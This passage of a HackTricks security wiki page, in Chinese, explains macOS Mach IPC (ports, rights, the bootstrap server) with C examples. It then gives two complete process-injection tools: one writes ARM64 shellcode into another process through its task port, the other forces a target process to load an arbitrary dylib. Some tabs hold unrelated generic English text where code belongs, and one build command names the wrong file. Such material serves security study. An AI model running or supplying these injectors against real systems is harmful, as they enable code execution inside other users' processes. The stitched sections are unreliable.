# macOS IPC - 进程间通信

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[NFTs](https://opensea.io/collection/the-peass-family)收藏品
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 通过端口进行Mach消息传递

### 基本信息

Mach使用**任务**作为共享资源的**最小单位**，每个任务可以包含**多个线程**。这些**任务和线程与POSIX进程和线程一一映射**。

任务之间的通信通过Mach进程间通信（IPC）进行，利用单向通信通道。**消息在端口之间传递**，端口类似于由内核管理的**消息队列**。

每个进程都有一个**IPC表**，可以在其中找到**进程的mach端口**。mach端口的名称实际上是一个数字（指向内核对象的指针）。

一个进程还可以将带有一些权限的端口名称**发送给另一个任务**，内核将使此条目出现在**另一个任务的IPC表**中。

### 端口权限

端口权限定义了任务可以执行的操作，对于这种通信至关重要。可能的**端口权限**包括（[此处的定义](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

- **接收权限**，允许接收发送到端口的消息。Mach端口是MPSC（多生产者，单消费者）队列，这意味着整个系统中可能只有**一个接收权限**与每个端口相关联（与管道不同，在管道的读端可以有多个进程持有文件描述符）。
- 具有**接收权限**的任务可以接收消息并**创建发送权限**，从而允许发送消息。最初，只有**自己的任务**对其端口具有接收权限。
- **发送权限**，允许向端口发送消息。
- 发送权限可以**克隆**，因此拥有发送权限的任务可以克隆权限并将其授予第三个任务。
- **一次性发送权限**，允许向端口发送一条消息，然后消失。
- **端口集权限**，表示一个_端口集_而不是单个端口。从端口集中出列消息会从其中一个端口中出列消息。端口集可用于同时监听多个端口，类似于Unix中的`select`/`poll`/`epoll`/`kqueue`。
- **死命名**，不是实际的端口权限，而只是一个占位符。当端口被销毁时，所有现有的端口权限将变成死命名。

**任务可以将发送权限传输给其他任务**，使其能够发送消息回来。**发送权限也可以被克隆**，因此任务可以复制并将权限授予第三个任务。结合一个称为**引导服务器**的中间进程，可以实现任务之间的有效通信。

### 建立通信

#### 步骤：

如前所述，为了建立通信通道，**引导服务器**（mac中的**launchd**）参与其中。

1. 任务**A**初始化一个**新端口**，在该过程中获得了一个**接收权限**。
2. 作为接收权限持有者的任务**A**，为端口**生成一个发送权限**。
3. 任务**A**通过引导注册过程与**引导服务器**建立**连接**，提供**端口的服务名称**和**发送权限**。
4. 任务**B**与**引导服务器**交互，执行服务名称的引导**查找**。如果成功，**服务器复制从任务A接收的发送权限**并**传输给任务B**。
5. 一旦获得发送权限，任务**B**就能够**制定**一条**消息**并将其**发送给任务A**。
6. 对于双向通信，通常任务**B**生成一个带有**接收权限**和**发送权限**的新端口，并将**发送权限提供给任务A**，以便其可以向任务B发送消息（双向通信）。

引导服务器**无法对**任务声称的服务名称进行**身份验证**。这意味着一个**任务**可能潜在地**冒充任何系统任务**，例如虚假**声明授权服务名称**，然后批准每个请求。

然后，Apple将**系统提供的服务名称**存储在安全配置文件中，位于**受SIP保护**的目录中：`/System/Library/LaunchDaemons`和`/System/Library/LaunchAgents`。在每个服务名称旁边，还存储了**关联的二进制文件**。引导服务器将为这些预定义服务名称创建并保留**每个服务名称的接收权限**。

对于这些预定义服务，**查找过程略有不同**。当查找服务名称时，launchd会动态启动服务。新的工作流程如下：

- 任务**B**启动一个服务名称的引导**查找**。
- **launchd**检查任务是否正在运行，如果没有，则**启动**它。
- 任务**A**（服务）执行**引导签入**。在这里，**引导**服务器创建一个发送权限，保留它，并**将接收权限传输给任务A**。
- launchd复制**发送权限并将其发送给任务B**。
- 任务**B**生成一个带有**接收权限**和**发送权限**的新端口，并将**发送权限提供给任务A**（服务），以便其可以向任务B发送消息（双向通信）。

然而，此过程仅适用于预定义的系统任务。非系统任务仍按最初描述的方式运行，这可能潜在地允许冒充。 

### 一个Mach消息

[在此处查找更多信息](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg`函数，本质上是一个系统调用，用于发送和接收Mach消息。该函数要求将消息作为初始参数发送。此消息必须以`mach_msg_header_t`结构开头，后跟实际消息内容。该结构定义如下：
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
拥有 _**接收权限**_ 的进程可以在 Mach 端口上接收消息。相反，**发送方** 被授予 _**发送权限**_ 或 _**一次性发送权限**_。一次性发送权限专门用于发送一条消息，之后将变为无效。

为了实现简单的 **双向通信**，进程可以在 mach **消息头** 中指定一个 **mach 端口**，称为 _回复端口_ (**`msgh_local_port`**)，消息的 **接收方** 可以向此消息发送一个回复。**`msgh_bits`** 中的位标志可用于 **指示**应为此端口派生并传输 **一次性发送权限** (`MACH_MSG_TYPE_MAKE_SEND_ONCE`)。

{% hint style="success" %}
请注意，这种双向通信在期望有回复的 XPC 消息中使用 (`xpc_connection_send_message_with_reply` 和 `xpc_connection_send_message_with_reply_sync`)。但通常会像前面解释的那样创建不同的端口来建立双向通信。
{% endhint %}

消息头的其他字段包括：

* `msgh_size`：整个数据包的大小。
* `msgh_remote_port`：发送此消息的端口。
* `msgh_voucher_port`：[mach 凭证](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
* `msgh_id`：此消息的 ID，由接收方解释。

{% hint style="danger" %}
请注意，**mach 消息通过**_**mach 端口**_ 发送，这是内置于 mach 内核中的 **单接收方**、**多发送方** 通信通道。**多个进程** 可以向 mach 端口发送消息，但在任何时候只有 **一个进程可以读取** 它。
{% endhint %}

### 枚举端口
```bash
lsmp -p <pid>
```
您可以从[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)下载iOS上的工具进行安装。

### 代码示例

请注意**发送方**如何**分配**一个端口，为名称`org.darlinghq.example`创建一个**发送权限**，并将其发送到**引导服务器**，同时发送方请求该名称的**发送权限**并使用它来**发送消息**。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 

### macOS IPC - Inter-Process Communication

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate and share data with each other. In macOS, IPC can be achieved using various techniques such as Mach messages, XPC services, and Distributed Objects.

#### Mach Messages

Mach messages are a low-level IPC mechanism in macOS that allows processes to send messages to each other. This can be used for inter-process communication within the same system or across different systems.

#### XPC Services

XPC Services are a higher-level IPC mechanism in macOS that allows processes to communicate with each other using a client-server model. This can be used to create secure and sandboxed inter-process communication.

#### Distributed Objects

Distributed Objects is another IPC mechanism in macOS that allows objects to be passed between processes. This can be used to share complex data structures between processes.

Understanding these IPC mechanisms is crucial for developing secure and efficient macOS applications that require inter-process communication. By leveraging these techniques, developers can ensure that data is shared between processes in a controlled and secure manner.

```c
#include <stdio.h>
#include <mach/mach.h>

int main() {
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to allocate port: %s\n", mach_error_string(kr));
        return 1;
    }
    printf("Port allocated: %d\n", port);
    return 0;
}
```

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### 特权端口

- **主机端口**：如果一个进程对这个端口有**发送**权限，他可以获取关于**系统**的**信息**（例如`host_processor_info`）。
- **主机特权端口**：拥有对这个端口的**发送**权限的进程可以执行像加载内核扩展这样的**特权操作**。**进程需要是root**才能获得这个权限。
- 此外，为了调用**`kext_request`** API，需要具有其他授权**`com.apple.private.kext*`**，这些授权仅分配给苹果二进制文件。
- **任务名称端口**：_任务端口_的非特权版本。它引用任务，但不允许控制它。通过它似乎只能使用`task_info()`。
- **任务端口**（又名内核端口）**：拥有对此端口的发送权限，可以控制任务（读/写内存，创建线程等）。
- 调用`mach_task_self()`为调用者任务**获取此端口的名称**。此端口仅在**`exec()`**跨进程继承；使用`fork()`创建的新任务会获得一个新的任务端口（作为一个特例，在suid二进制文件中的`exec()`后，任务也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行`fork()`时执行["端口交换舞蹈"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)。
- 访问端口的限制（来自二进制文件`AppleMobileFileIntegrity`的`macos_task_policy`）如下：
  - 如果应用程序具有**`com.apple.security.get-task-allow`授权**，来自**相同用户的进程可以访问任务端口**（通常由Xcode用于调试）。**经过验证**的过程不会允许将其用于生产发布。
  - 具有**`com.apple.system-task-ports`授权**的应用程序可以获取任何进程的**任务端口**，除了内核。在旧版本中，它被称为**`task_for_pid-allow`**。这仅授予给苹果应用程序。
  - **Root可以访问**未使用**强化**运行时编译的应用程序的任务端口（且不是来自苹果）。

### 通过任务端口在线程中注入Shellcode

您可以从以下位置获取一个shellcode：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}

## macOS IPC (Inter-Process Communication)

### Introduction

Inter-Process Communication (IPC) mechanisms are essential for processes to communicate with each other on macOS. These mechanisms include Mach ports, XPC services, and Distributed Objects. Understanding how IPC works is crucial for both developers and security professionals to ensure secure communication between processes.

### Mach Ports

Mach ports are the fundamental IPC mechanism in macOS. They allow processes to send messages and data between each other. Each Mach port has a unique port name and can be used for various purposes, such as inter-process communication, synchronization, and task control.

### XPC Services

XPC (XPC Services) is a lightweight IPC mechanism introduced in macOS X Snow Leopard. XPC services allow processes to communicate with each other securely. They are commonly used for implementing privileged helper tools and background services.

### Distributed Objects

Distributed Objects is an IPC mechanism that allows objects to be passed between processes. It enables remote procedure calls and object serialization, making it easier for processes to interact with each other. Distributed Objects are commonly used in macOS applications for inter-process communication.

Understanding these IPC mechanisms and how they are used in macOS applications is essential for securing the communication between processes and preventing privilege escalation attacks.

### Conclusion

Inter-Process Communication is a critical aspect of macOS security. By understanding the different IPC mechanisms and how they are used in applications, developers and security professionals can ensure secure communication between processes and prevent potential security vulnerabilities.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**编译**前面的程序并添加**权限**以能够使用相同用户注入代码（如果不行，您将需要使用**sudo**）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### 通过任务端口在线程中进行Dylib注入

在 macOS 中，**线程** 可能通过 **Mach** 或使用 **posix `pthread` api** 进行操作。我们在之前的注入中生成的线程是使用 Mach api 生成的，因此**不符合 posix 标准**。

可以**注入简单的 shellcode** 来执行命令，因为它**不需要与 posix 兼容的 api 一起工作**，只需要与 Mach 一起。**更复杂的注入** 需要**线程** 也符合 **posix 标准**。

因此，为了**改进线程**，应该调用 **`pthread_create_from_mach_thread`**，这将**创建一个有效的 pthread**。然后，这个新的 pthread 可以**调用 dlopen** 来**从系统加载 dylib**，因此，不需要编写新的 shellcode 来执行不同的操作，可以加载自定义库。

您可以在这里找到**示例 dylibs**（例如生成日志然后您可以监听它的 dylib）：

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
